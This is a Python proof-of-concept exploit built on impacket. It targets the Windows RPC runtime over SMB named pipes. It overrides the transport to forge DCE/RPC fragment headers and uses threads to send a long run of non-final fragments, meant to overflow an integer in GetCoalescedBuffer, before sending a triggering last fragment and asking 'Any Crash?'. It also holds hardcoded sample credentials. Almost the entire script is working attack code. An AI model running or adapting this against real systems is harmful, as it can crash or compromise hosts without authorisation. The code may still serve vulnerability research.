from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_CONNECT
from impacket.dcerpc.v5.transport import DCERPCStringBinding
from impacket.dcerpc.v5.transport import TCPTransport
from impacket.dcerpc.v5.transport import SMBTransport
from impacket.dcerpc.v5.transport import UDPTransport
from impacket.dcerpc.v5.transport import HTTPTransport
from impacket.dcerpc.v5.transport import LOCALTransport
from impacket.dcerpc.v5.transport import DCERPC_v5

import threading
import sys

def My_DCERPCTransportFactory(stringbinding):
    sb = DCERPCStringBinding(stringbinding)

    na = sb.get_network_address()
    ps = sb.get_protocol_sequence()
    if 'ncadg_ip_udp' == ps:
        port = sb.get_endpoint()
        if port:
            rpctransport = UDPTransport(na, int(port))
        else:
            rpctransport = UDPTransport(na)
    elif 'ncacn_ip_tcp' == ps:
        port = sb.get_endpoint()
        if port:
            rpctransport = TCPTransport(na, int(port))
        else:
            rpctransport = TCPTransport(na)
    elif 'ncacn_http' == ps:
        port = sb.get_endpoint()
        if port:
            rpctransport = HTTPTransport(na, int(port))
        else:
            rpctransport = HTTPTransport(na)
    elif 'ncacn_np' == ps:
        named_pipe = sb.get_endpoint()
        if named_pipe:
            named_pipe = named_pipe[len(r'\pipe'):]
            rpctransport = MySMBTransport(na, filename = named_pipe)
        else:
            rpctransport = MySMBTransport(na)
    elif 'ncalocal' == ps:
        named_pipe = sb.get_endpoint()
        rpctransport = LOCALTransport(filename = named_pipe)
    else:
        raise DCERPCException("Unknown protocol sequence.")

    rpctransport.set_stringbinding(sb)
    return rpctransport
    
class MYDCERPC_v5(DCERPC_v5):
    def __init__(self, transport):
        super().__init__(transport)

class MySMBTransport(SMBTransport):
    def get_dce_rpc(self):
        return MYDCERPC_v5(self)

    def modify_packets(self, data, flag, alloc_hint, call_id, frag_len, buf):
        tmp_d = data[0:3]
        if flag is not None:
            tmp_d += flag.to_bytes(1, 'big')
        else:
            tmp_d += data[3:4] # copied flags

        tmp_d += data[4:8] # copied pkt representation

        if frag_len is not None:
            tmp_d += (frag_len).to_bytes(2, 'little')
        else:
            tmp_d += data[8:10]
        
        tmp_d += data[10:12] # copied auth len

        if call_id is not None:
            tmp_d += (call_id).to_bytes(4, 'little') # callid
        else:
            tmp_d += data[12:16]
        
        if alloc_hint is not None:
            tmp_d += (alloc_hint).to_bytes(4, 'little') # alloc hint
        else:
            tmp_d += data[16:20]
        tmp_d += data[20:24]
        if buf is not None:
            tmp_d += buf
        else:
            tmp_d += data[24:]
        return tmp_d

    def get_integer_overflow(self, data, index_, no_threads):
        raw_d = b'A'*0x1000
        i = 0
        tot_req = ((0x100000000 - 0x1000)//0x1000)//no_threads
        print("\t[+] thread{} starts to send {} fragments...".format(index_, tot_req))
        # sends multiple packets with no last fragment -> at some point expects some crash
        d = self.modify_packets(data, 0, 0, 4, len(raw_d)+self.fixed_header_len, raw_d)
        while i < tot_req:
            try:
                super().get_smb_connection().writeFile(self._SMBTransport__tid, self._SMBTransport__handle, d)
            except Exception as e:
                print("[-] Exception Got on {}th send: {}".format(i,e))
                break
            i += 1

    def run_in_parallel(self, data):
        threads = []
        thread_max = 1
        print("[+] starts threads to overflow the integer in GetCoalescedBuffer faster")
        # wait for all threads
        for i in range(0, thread_max):
            th1 = threading.Thread(target=self.get_integer_overflow, args=([data, i, thread_max]))
            th1.start()
            threads.append(th1)
        # wait for all threads
        for i in range(0, thread_max):
            threads[i].join()

    # Override transport send in order to modify packet frag len
    def send(self,data, forceWriteAndx = 0, forceRecv = 0):
        self.fixed_header_len = 0x18
        global fragment_size
        '''
            0ffset 0  : version 1 byte long
            Offset 1  : minor 1 byte long
            Offset 2  : packet type 1 byte long
            offset 3  : packet flags 1 byte long
            offset 4  : packet representation 4 bytes long
            offset 8  : frag len 2 bytes long
            offset 10 : auth len 2 bytes long
            offset 12 : Call ID 4 bytes long
            offset 16 : alloc hint 4 bytes long
            offset 20 : context id 2 bytes long
            offset 22 : opnum 2 bytes long
            offset 24 : data payload
            offset 24 + frag len : auth part auth len long
        '''
        if b'DATATOSEND!' in data:
            raw_d = b'A'*0x1000
            alloc_hint = 0x1000
            # alloc_hint == len(raw_d)+fixed_header_len - fixed_header_len =>  makes on the first packet to enter in DispatchRpcCall() that set this + 0x214 to 1
            print("[+] Sending first fragment packet to make (*(int *)(this + 0x1d8) == *(int *)(this + 0x248) and enter the putOnqueue code")
            print("\tAlloc_hint = {}".format(alloc_hint))
            print("\tLen PDU payload = {}".format(len(raw_d)))
            d = self.modify_packets(data, 0x1, alloc_hint, 4, len(raw_d)+self.fixed_header_len, raw_d)
            super().get_smb_connection().writeFile(self._SMBTransport__tid, self._SMBTransport__handle, d)
            # run multiple threads to trigger faster integer overflow
            self.run_in_parallel(data)
            input("[+] Enter to trigger with the last fragment!")
            d = self.modify_packets(data, 2, 0, 4, len(raw_d)+self.fixed_header_len, raw_d)
            super().get_smb_connection().writeFile(self._SMBTransport__tid, self._SMBTransport__handle, d)
        else:
            # setting multiplex in the DCERPC
            #d = self.modify_packets(data, int.from_bytes(data[4:5], "big") | 0x10, None, None, None, None)
            #if len(d) > fragment_size:
            if len(data) > fragment_size:
                offset = 0
                while 1:
                    toSend = d[offset:offset+fragment_size]
                    if not toSend:
                        break
                    super().get_smb_connection().writeFile(self._SMBTransport__tid, self._SMBTransport__handle, toSend)
                    offset += len(toSend)
            else:
                super().get_smb_connection().writeFile(self._SMBTransport__tid, self._SMBTransport__handle, data)

protoseq = "ncacn_np"
ip = sys.argv[1]
port = sys.argv[2]
uuid = sys.argv[3] # my uuid 'a29b0684-dd1f-49fc-8d41-760c344ad111'
binding = protoseq+':' + ip + '[' + port + ']'
fragment_size = 0x1000

def main(binding, uuid):
    rpctransport = My_DCERPCTransportFactory(binding)
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials('John', 'Passw0rd!', '')
    dce = rpctransport.get_dce_rpc()
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
    print('[+]\t Connecting to {}'.format(binding))
    dce.set_max_fragment_size(fragment_size)
    dce.connect()
    print('[+]\t Binding to {}'.format(uuid))
    dce.bind(uuidtup_to_bin((uuid, '1.0')))
    print('[+]\t Starts triggering vulnerability')
    dce.call(0, b"DATATOSEND!")
    print('[+]\t Any Crash?')
    dce.disconnect()

main(binding, uuid)